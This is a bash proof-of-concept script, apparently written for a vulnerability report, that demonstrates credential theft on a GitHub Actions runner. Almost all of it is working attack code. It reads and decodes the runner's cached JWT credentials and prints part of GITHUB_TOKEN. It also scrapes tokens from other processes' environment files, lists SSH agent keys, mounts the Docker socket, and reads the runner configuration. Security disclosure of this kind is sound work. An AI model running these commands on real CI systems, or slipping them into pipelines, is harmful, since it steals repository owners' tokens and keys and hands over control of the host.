#!/bin/bash
# Proof of Concept: GitHub Actions Secrets and Token Theft
# Severity: HIGH (CVSS 7.8)
# Description: Demonstrates ability to steal GitHub tokens and credentials

echo "=================================================================="
echo "PoC: GitHub Actions Secrets & Token Theft"
echo "=================================================================="
echo ""

echo "[*] Demonstrating access to GitHub Actions credentials"
echo ""

echo "=================================================================="
echo "Test 1: GitHub Actions Runner Credentials"
echo "=================================================================="
echo ""
echo "[+] Reading .credentials file..."
if [ -f /home/runner/actions-runner/cached/.credentials ]; then
  cat /home/runner/actions-runner/cached/.credentials | jq . 2>/dev/null
  echo ""
  echo "[!] SUCCESS: GitHub Actions JWT token found!"
  echo ""
  echo "[+] Decoding token payload..."
  TOKEN=$(cat /home/runner/actions-runner/cached/.credentials | jq -r '.Data.token')
  echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq . 2>/dev/null
else
  echo "[-] Credentials file not found"
fi

echo ""
echo "=================================================================="
echo "Test 2: GitHub Token from Environment"
echo "=================================================================="
echo ""
echo "[+] Checking environment variables..."
if [ ! -z "$GITHUB_TOKEN" ]; then
  echo "GITHUB_TOKEN found: ${GITHUB_TOKEN:0:20}..."
  echo "[!] SUCCESS: GitHub token in environment!"
else
  echo "[-] GITHUB_TOKEN not in current environment"
  echo "[+] Checking process environments..."
  grep -h "GITHUB_TOKEN" /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep GITHUB_TOKEN | head -3
fi

echo ""
echo "=================================================================="
echo "Test 3: SSH Agent Socket"
echo "=================================================================="
echo ""
echo "[+] Checking for SSH agent..."
if [ -S "/run/user/1001/gnupg/S.gpg-agent.ssh" ]; then
  ls -la /run/user/1001/gnupg/S.gpg-agent.ssh
  echo "[+] SSH agent socket found!"
  echo "[+] Attempting to list keys..."
  SSH_AUTH_SOCK=/run/user/1001/gnupg/S.gpg-agent.ssh ssh-add -l 2>&1
else
  echo "[-] SSH agent socket not found"
fi

echo ""
echo "=================================================================="
echo "Test 4: Docker Socket Access"
echo "=================================================================="
echo ""
echo "[+] Testing Docker socket mounting..."
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock alpine sh -c "
  echo '[+] Docker socket mounted:'
  ls -la /var/run/docker.sock
  echo '[!] SUCCESS: Can access Docker daemon!'
" 2>&1

echo ""
echo "=================================================================="
echo "Test 5: Runner Configuration Files"
echo "=================================================================="
echo ""
echo "[+] Reading runner configuration..."
if [ -f /home/runner/actions-runner/cached/.runner ]; then
  cat /home/runner/actions-runner/cached/.runner | jq . 2>/dev/null
  echo "[!] SUCCESS: Runner config accessible!"
fi

echo ""
echo "=================================================================="
echo "Impact Assessment"
echo "=================================================================="
echo ""
echo "✓ Token Theft: GitHub Actions tokens accessible"
echo "✓ Credential Access: Runner credentials found"
echo "✓ Docker Control: Can access Docker daemon"
echo "✓ SSH Agent: Socket available (if keys loaded)"
echo "✓ Config Access: Runner configuration readable"
echo ""
echo "Severity: HIGH (CVSS 7.8)"
echo "Mitigation: Encrypt credentials, restrict file access"
echo ""
